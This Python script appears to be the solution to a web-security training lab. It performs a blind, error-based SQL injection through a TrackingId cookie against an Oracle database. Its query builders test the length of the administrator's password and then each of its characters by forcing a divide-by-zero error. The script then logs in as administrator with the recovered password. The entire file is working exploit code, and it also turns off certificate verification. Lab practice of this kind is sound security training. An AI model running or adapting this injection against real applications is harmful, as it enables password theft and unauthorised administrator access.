import sys
import logging
import urllib3

import requests

import utils
from shop import Shop
from sqli import SQLi
log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MySQLi(SQLi):
    def __init__(self, tracking_id, session_token):
        super().__init__()
        self.max_length = 100
        self.tracking_id = tracking_id
        self.session_token = session_token
    def format_length_query(self, inner_query, length):
        return (
            f"{self.tracking_id}'||(SELECT CASE WHEN ((select LENGTH(({inner_query})) from dual)"
            f"={length}) THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
        )
        
    def format_char_query(self, inner_query, index, char):
        return(
            f"{self.tracking_id}'||(SELECT CASE WHEN (("
            f"select substr(({inner_query}),{index},1) from dual)=chr({char}))"
            " THEN TO_CHAR(1/0) ELSE NULL END from dual)-- "
        )
    def is_true(self, resp):
        if resp.status_code == 200:
            return False
        return True
    def format_request(self, url, outer_query):
        cookies = {
            "TrackingId": outer_query,
            "session": self.session_token,
        }
        request = requests.Request("GET", url, cookies=cookies)
        prepped = request.prepare()
        return prepped
          

def main(args):
    session = requests.Session()
    shop = Shop(args.url, args.no_proxy, session)
    log.info("Getting tracking id and session tocen.")
    if args.no_proxy:
        resp = requests.get(shop.base_url)
    else:
        resp = requests.get(shop.base_url, proxies=utils.PROXIES, verify=False)
    tracking_id = resp.cookies["TrackingId"]
    session_token = resp.cookies["session"]
    log.info(f"TrackingId: {tracking_id}")
    sqli = MySQLi(tracking_id, session_token)
    password = sqli.get_response_string(
        "SELECT password from users where username = 'administrator'",
        shop.base_url,
        shop.no_proxy,
        10,
    )
    log.info(f"Received password: {password}")
    shop.login("administrator", password)
    shop.is_solved()
    
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
    
    